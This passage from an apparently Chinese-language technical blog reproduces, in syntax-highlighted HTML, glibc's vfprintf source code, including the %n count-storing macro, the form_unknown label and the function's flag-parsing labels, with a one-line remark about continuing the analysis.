done;\t\t\t\t      \\</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (is_long_num)\t\t\t\t\t\t      \\</span><br><span class=\"line\">\t*(<span class=\"type\">long</span> <span class=\"type\">int</span> *) ptrptr = done;\t\t\t\t\t      \\</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (is_char)\t\t\t\t\t\t\t      \\</span><br><span class=\"line\">\t*(<span class=\"type\">char</span> *) ptrptr = done;\t\t\t\t\t      \\</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (!is_short)\t\t\t\t\t\t      \\</span><br><span class=\"line\">\t*(<span class=\"type\">int</span> *) ptrptr = done;\t\t\t\t\t\t      \\</span><br><span class=\"line\">      <span class=\"keyword\">else</span>\t\t\t\t\t\t\t\t      \\</span><br><span class=\"line\">\t*(<span class=\"type\">short</span> <span class=\"type\">int</span> *) ptrptr = done;\t\t\t\t\t      \\</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;\t\t</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"LABEL-unknow\"><a href=\"#LABEL-unknow\" class=\"headerlink\" title=\"LABEL(unknow)\"></a>LABEL(unknow)</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LABEL (form_unknown):</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (spec == L_(<span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* The format string ended before the specifier is complete.  */</span></span><br><span class=\"line\">      __set_errno (EINVAL);</span><br><span class=\"line\">      done = <span class=\"number\">-1</span>;</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* If we are in the fast loop force entering the complicated</span></span><br><span class=\"line\"><span class=\"comment\">     one.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">goto</span> do_positional;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>所以继续分析vfprintf 函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br><span class=\"line\">422</span><br><span class=\"line\">423</span><br><span class=\"line\">424</span><br><span class=\"line\">425</span><br><span class=\"line\">426</span><br><span class=\"line\">427</span><br><span class=\"line\">428</span><br><span class=\"line\">429</span><br><span class=\"line\">430</span><br><span class=\"line\">431</span><br><span class=\"line\">432</span><br><span class=\"line\">433</span><br><span class=\"line\">434</span><br><span class=\"line\">435</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span></span><br><span class=\"line\"><span class=\"title function_\">vfprintf</span> <span class=\"params\">(FILE *s, <span class=\"type\">const</span> CHAR_T *format, va_list ap, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> mode_flags)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">/* The character used as thousands separator.  */</span></span><br><span class=\"line\">  THOUSANDS_SEP_T thousands_sep = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* The string describing the size of groups of digits.  */</span></span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">char</span> *grouping;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Place to accumulate the result.  */</span></span><br><span class=\"line\">  <span class=\"type\">int</span> done;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Current character in format string.  */</span></span><br><span class=\"line\">  <span class=\"type\">const</span> UCHAR_T *f;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* End of leading constant string.  */</span></span><br><span class=\"line\">  <span class=\"type\">const</span> UCHAR_T *lead_str_end;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Points to next format specifier.  */</span></span><br><span class=\"line\">  <span class=\"type\">const</span> UCHAR_T *end_of_spec;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Buffer intermediate results.  */</span></span><br><span class=\"line\">  CHAR_T work_buffer[WORK_BUFFER_SIZE];</span><br><span class=\"line\">  CHAR_T *workend;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* We have to save the original argument pointer.  */</span></span><br><span class=\"line\">  va_list ap_save;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Count number of specifiers we already processed.  */</span></span><br><span class=\"line\">  <span class=\"type\">int</span> nspecs_done;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* For the %m format we may need the current `errno&#x27; value.  */</span></span><br><span class=\"line\">  <span class=\"type\">int</span> save_errno = errno;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* 1 if format is in read-only memory, -1 if it is in writable memory,</span></span><br><span class=\"line\"><span class=\"comment\">     0 if unknown.  */</span></span><br><span class=\"line\">  <span class=\"type\">int</span> readonly_format = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Orient the stream.  */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> ORIENT</span></span><br><span class=\"line\">  ORIENT;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Sanity check of arguments.  */</span></span><br><span class=\"line\">  ARGCHECK (s, format);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> ORIENT</span></span><br><span class=\"line\">  <span class=\"comment\">/* Check for correct orientation.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (_IO_vtable_offset (s) == <span class=\"number\">0</span></span><br><span class=\"line\">      &amp;&amp; _IO_fwide (s, <span class=\"keyword\">sizeof</span> (CHAR_T) == <span class=\"number\">1</span> ? <span class=\"number\">-1</span> : <span class=\"number\">1</span>)</span><br><span class=\"line\">      != (<span class=\"keyword\">sizeof</span> (CHAR_T) == <span class=\"number\">1</span> ? <span class=\"number\">-1</span> : <span class=\"number\">1</span>))</span><br><span class=\"line\">    <span class=\"comment\">/* The stream is already oriented otherwise.  */</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (UNBUFFERED_P (s))</span><br><span class=\"line\">    <span class=\"comment\">/* Use a helper function which will allocate a local temporary buffer</span></span><br><span class=\"line\"><span class=\"comment\">       for the stream and then call us again.  */</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> buffered_vfprintf (s, format, ap, mode_flags);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Initialize local variables.  */</span></span><br><span class=\"line\">  done = <span class=\"number\">0</span>;</span><br><span class=\"line\">  grouping = (<span class=\"type\">const</span> <span class=\"type\">char</span> *) <span class=\"number\">-1</span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> __va_copy</span></span><br><span class=\"line\">  <span class=\"comment\">/* This macro will be available soon in gcc&#x27;s &lt;stdarg.h&gt;.  We need it</span></span><br><span class=\"line\"><span class=\"comment\">     since on some systems `va_list&#x27; is not an integral type.  */</span></span><br><span class=\"line\">  __va_copy (ap_save, ap);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\">  ap_save = ap;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">  nspecs_done = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> COMPILE_WPRINTF</span></span><br><span class=\"line\">  <span class=\"comment\">/* Find the first format specifier.  */</span></span><br><span class=\"line\">  f = lead_str_end = __find_specwc ((<span class=\"type\">const</span> UCHAR_T *) format);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\">  <span class=\"comment\">/* Find the first format specifier.  */</span></span><br><span class=\"line\">  f = lead_str_end = __find_specmb ((<span class=\"type\">const</span> UCHAR_T *) format);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Lock stream.  */</span></span><br><span class=\"line\">  _IO_cleanup_region_start ((<span class=\"type\">void</span> (*) (<span class=\"type\">void</span> *)) &amp;_IO_funlockfile, s);</span><br><span class=\"line\">  _IO_flockfile (s);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Write the literal text before the first format.  */</span></span><br><span class=\"line\">  outstring ((<span class=\"type\">const</span> UCHAR_T *) format,</span><br><span class=\"line\">\t     lead_str_end - (<span class=\"type\">const</span> UCHAR_T *) format);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* If we only have to print a simple string, return now.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (*f == L_(<span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Use the slow path in case any printf handler is registered.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (__glibc_unlikely (__printf_function_table != <span class=\"literal\">NULL</span></span><br><span class=\"line\">\t\t\t|| __printf_modifier_table != <span class=\"literal\">NULL</span></span><br><span class=\"line\">\t\t\t|| __printf_va_arg_table != <span class=\"literal\">NULL</span>))</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> do_positional;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Process whole format string.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">do</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      STEP0_3_TABLE;</span><br><span class=\"line\">      STEP4_TABLE;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"type\">int</span> is_negative;\t<span class=\"comment\">/* Flag for negative number.  */</span></span><br><span class=\"line\">      <span class=\"class\"><span class=\"keyword\">union</span></span></span><br><span class=\"line\"><span class=\"class\">      &#123;</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> <span class=\"type\">int</span> longlong;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">int</span> word;</span><br><span class=\"line\">      &#125; number;</span><br><span class=\"line\">      <span class=\"type\">int</span> base;</span><br><span class=\"line\">      <span class=\"class\"><span class=\"keyword\">union</span> <span class=\"title\">printf_arg</span> <span class=\"title\">the_arg</span>;</span></span><br><span class=\"line\">      CHAR_T *<span class=\"built_in\">string</span>;\t<span class=\"comment\">/* Pointer to argument string.  */</span></span><br><span class=\"line\">      <span class=\"type\">int</span> alt = <span class=\"number\">0</span>;\t<span class=\"comment\">/* Alternate format.  */</span></span><br><span class=\"line\">      <span class=\"type\">int</span> space = <span class=\"number\">0</span>;\t<span class=\"comment\">/* Use space prefix if no sign is needed.  */</span></span><br><span class=\"line\">      <span class=\"type\">int</span> left = <span class=\"number\">0</span>;\t<span class=\"comment\">/* Left-justify output.  */</span></span><br><span class=\"line\">      <span class=\"type\">int</span> showsign = <span class=\"number\">0</span>;\t<span class=\"comment\">/* Always begin with plus or minus sign.  */</span></span><br><span class=\"line\">      <span class=\"type\">int</span> group = <span class=\"number\">0</span>;\t<span class=\"comment\">/* Print numbers according grouping rules.  */</span></span><br><span class=\"line\">      <span class=\"comment\">/* Argument is long double/long long int.  Only used if</span></span><br><span class=\"line\"><span class=\"comment\">\t double/long double or long int/long long int are distinct.  */</span></span><br><span class=\"line\">      <span class=\"type\">int</span> is_long_double __attribute__ ((unused)) = <span class=\"number\">0</span>;</span><br><span class=\"line\">      <span class=\"type\">int</span> is_short = <span class=\"number\">0</span>;\t<span class=\"comment\">/* Argument is short int.  */</span></span><br><span class=\"line\">      <span class=\"type\">int</span> is_long = <span class=\"number\">0</span>;\t<span class=\"comment\">/* Argument is long int.  */</span></span><br><span class=\"line\">      <span class=\"type\">int</span> is_char = <span class=\"number\">0</span>;\t<span class=\"comment\">/* Argument is promoted (unsigned) char.  */</span></span><br><span class=\"line\">      <span class=\"type\">int</span> width = <span class=\"number\">0</span>;\t<span class=\"comment\">/* Width of output; 0 means none specified.  */</span></span><br><span class=\"line\">      <span class=\"type\">int</span> prec = <span class=\"number\">-1</span>;\t<span class=\"comment\">/* Precision of output; -1 means none specified.  */</span></span><br><span class=\"line\">      <span class=\"comment\">/* This flag is set by the &#x27;I&#x27; modifier and selects the use of the</span></span><br><span class=\"line\"><span class=\"comment\">\t `outdigits&#x27; as determined by the current locale.  */</span></span><br><span class=\"line\">      <span class=\"type\">int</span> use_outdigits = <span class=\"number\">0</span>;</span><br><span class=\"line\">      UCHAR_T pad = L_(<span class=\"string\">&#x27; &#x27;</span>);<span class=\"comment\">/* Padding character.  */</span></span><br><span class=\"line\">      CHAR_T spec;</span><br><span class=\"line\"></span><br><span class=\"line\">      workend = work_buffer + WORK_BUFFER_SIZE;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Get current character in format string.  */</span></span><br><span class=\"line\">      JUMP (*++f, step0_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* &#x27; &#x27; flag.  */</span></span><br><span class=\"line\">    LABEL (flag_space):</span><br><span class=\"line\">      space = <span class=\"number\">1</span>;</span><br><span class=\"line\">      JUMP (*++f, step0_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* &#x27;+&#x27; flag.  */</span></span><br><span class=\"line\">    LABEL (flag_plus):</span><br><span class=\"line\">      showsign = <span class=\"number\">1</span>;</span><br><span class=\"line\">      JUMP (*++f, step0_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* The &#x27;-&#x27; flag.  */</span></span><br><span class=\"line\">    LABEL (flag_minus):</span><br><span class=\"line\">      left = <span class=\"number\">1</span>;</span><br><span class=\"line\">      pad = L_(<span class=\"string\">&#x27; &#x27;</span>);</span><br><span class=\"line\">      JUMP (*++f, step0_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* The &#x27;#&#x27; flag.  */</span></span><br><span class=\"line\">    LABEL (flag_hash):</span><br><span class=\"line\">      alt = <span class=\"number\">1</span>;</span><br><span class=\"line\">      JUMP (*++f, step0_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* The &#x27;0&#x27; flag.  */</span></span><br><span class=\"line\">    LABEL (flag_zero):</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!left)</span><br><span class=\"line\">\tpad = L_(<span class=\"string\">&#x27;0&#x27;</span>);</span><br><span class=\"line\">      JUMP (*++f, step0_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* The &#x27;\\&#x27;&#x27; flag.  */</span></span><br><span class=\"line\">    LABEL (flag_quote):</span><br><span class=\"line\">      group = <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (grouping == (<span class=\"type\">const</span> <span class=\"type\">char</span> *) <span class=\"number\">-1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> COMPILE_WPRINTF</span></span><br><span class=\"line\">\t  thousands_sep = _NL_CURRENT_WORD (LC_NUMERIC,</span><br><span class=\"line\">\t\t\t\t\t    _NL_NUMERIC_THOUSANDS_SEP_WC);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\">\t  thousands_sep = _NL_CURRENT (LC_NUMERIC, THOUSANDS_SEP);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">\t  grouping = _NL_CURRENT (LC_NUMERIC, GROUPING);</span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (*grouping == <span class=\"string\">&#x27;\\0&#x27;</span> || *grouping == CHAR_MAX</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> COMPILE_WPRINTF</span></span><br><span class=\"line\">\t      || thousands_sep == <span class=\"string\">L&#x27;\\0&#x27;</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\">\t      || *thousands_sep == <span class=\"string\">&#x27;\\0&#x27;</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">\t      )</span><br><span class=\"line\">\t    grouping = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">      JUMP (*++f, step0_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">    LABEL (flag_i18n):</span><br><span class=\"line\">      use_outdigits = <span class=\"number\">1</span>;</span><br><span class=\"line\">      JUMP (*++f, step0_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Get width from argument.  */</span></span><br><span class=\"line\">    LABEL (width_asterics):</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">\t<span class=\"type\">const</span> UCHAR_T *tmp;\t<span class=\"comment\">/* Temporary value.  */</span></span><br><span 